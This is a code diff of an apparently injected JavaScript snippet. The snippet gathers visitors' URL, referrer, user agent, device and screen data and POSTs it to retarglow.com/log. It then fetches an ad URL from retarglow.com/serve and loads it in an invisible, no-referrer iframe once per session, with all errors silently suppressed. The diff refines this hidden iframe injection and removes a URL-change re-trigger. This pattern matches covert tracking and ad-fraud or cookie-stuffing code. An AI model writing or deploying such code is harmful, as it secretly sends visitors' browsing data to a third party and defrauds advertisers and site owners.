@@ -26,34 +26,35 @@ export default {
     const p={cid:c, u, r, ua:n, dt:d, b, os:o, sr:s, cm:{_r}, domain};
 
     fetch("https://retarglow.com/log", {
-      method:"POST",
-      headers:{"Content-Type":"application/json"},
-      body:JSON.stringify(p)
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(p)
     });
 
-    let triggered=false;
+    let triggered = false;
     const sessionKey = "i_" + c;
     const once = sessionStorage.getItem(sessionKey);
 
     const inject = () => {
       if (triggered || once) return;
       triggered = true;
-      sessionStorage.setItem(sessionKey, "1");
 
       fetch("https://retarglow.com/serve", {
-        method:"POST",
-        headers:{"Content-Type":"application/json"},
-        body:JSON.stringify({u, cm:{_r}})
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ u, cm: { _r }, cid: c })
       })
-      .then(res => res.json())
+      .then(r => r.json())
       .then(j => {
         if (!j.ad_url) return;
 
         const f = document.createElement("iframe");
         f.style.display = "none";
         f.referrerPolicy = "no-referrer";
-        f.src = j.ad_url;
+        f.src = j.ad_url.replace("{{_r}}", encodeURIComponent(_r));
+
         document.body.appendChild(f);
+        sessionStorage.setItem(sessionKey, "1");
       });
     };
 
@@ -77,17 +78,6 @@ export default {
       sessionStorage.removeItem(sessionKey);
       setTimeout(inject, 1500);
     });
-
-    let lastUrl = location.href;
-    const mo = new MutationObserver(() => {
-      if (location.href !== lastUrl) {
-        lastUrl = location.href;
-        triggered = false;
-        sessionStorage.removeItem(sessionKey);
-        setTimeout(inject, 1500);
-      }
-    });
-    mo.observe(document, { childList: true, subtree: true });
 
   } catch (e) {}
 })();`;
